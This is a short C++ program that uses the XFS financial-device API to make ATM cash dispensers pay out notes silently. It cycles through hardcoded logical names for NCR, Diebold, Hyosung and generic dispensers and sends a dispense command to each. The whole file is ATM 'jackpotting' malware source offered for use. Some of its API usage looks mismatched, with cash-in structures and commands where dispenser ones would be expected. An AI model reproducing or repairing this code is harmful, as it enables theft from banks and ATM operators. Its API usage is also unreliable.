#include <windows.h>
#include <xfsapi.h>
#include <iostream>
#include <vector>
#include <string>

#pragma comment(lib, "xfsapi.lib")  // Link with the XFS API library

// Logical names to try (fallback list)
std::vector<std::string> logicalNames = {
    "DISP1", "DISPENSER1", "CASHDISP01", "IDISPENSE1", "DISP_UNIT1",
    "CEN_DISP", "NCRDISP01", "NCR_CASHUNIT_1", "DN_DISP", "DIEBOLD_DISP1",
    "DN_CASHDISP01", "CASHDISP", "GEN_DISP", "HYO_DISP1"
};

#define AMOUNT_TO_DISPENSE 5

void SilentDispense(const std::string& logicalName) {
    HRESULT hResult;
    HSERVICE hService = NULL;
    HAPP hApp = NULL;
    LPWFSRESULT lpResult = nullptr;

    // Start up XFS Manager
    hResult = WFSStartUp(MAKEWORD(3, 10), nullptr);
    if (hResult != WFS_SUCCESS) return;

    // Register application
    hResult = WFSRegister(nullptr, WFS_DEFAULT_HAPP, WFS_TRACE_ALL_API, 0, &hApp);
    if (hResult != WFS_SUCCESS) {
        WFSCleanUp();
        return;
    }

    // Try to open the logical name (dispenser)
    hResult = WFSOpen(logicalName.c_str(), WFS_DEFAULT_HAPP, "ATM_DISP", WFS_TRACE_ALL_API, WFS_INDEFINITE_WAIT, nullptr, &hService);
    if (hResult != WFS_SUCCESS) {
        WFSUnRegister(hApp);
        WFSCleanUp();
        return;
    }

    // Create basic cash dispense structure (XFS CASHDISPENSE)
    WFSCIMCASHIN cashUnit = { 0 };
    LPWFSCIMCASHIN lpUnits[2] = { &cashUnit, nullptr };

    cashUnit.usNumber = 1;                        // Cassette 1
    cashUnit.ulCount = AMOUNT_TO_DISPENSE;       // Dispense X bills
    cashUnit.ulCashInCount = 0;
    cashUnit.ulMaximum = 40;
    cashUnit.ulMinimum = 0;

    WFSCIMDISPENSE dispense = { 0 };
    dispense.usTellerID = 0;
    dispense.fwPosition = WFS_CIM_POSFRONT;
    dispense.usNumOfBills = 1;
    dispense.lppCashUnit = (LPWFSCIMCASHIN*)lpUnits;

    // Execute the DISPENSE command
    hResult = WFSExecute(hService, WFS_CMD_CIM_DISPENSE, &dispense, WFS_INDEFINITE_WAIT, &lpResult);

    if (lpResult) {
        WFSFreeResult(lpResult);
    }

    // Close and clean up
    WFSClose(hService);
    WFSUnRegister(hApp);
    WFSCleanUp();
}

int main() {
    for (const auto& name : logicalNames) {
        SilentDispense(name);
    }
    return 0;
}
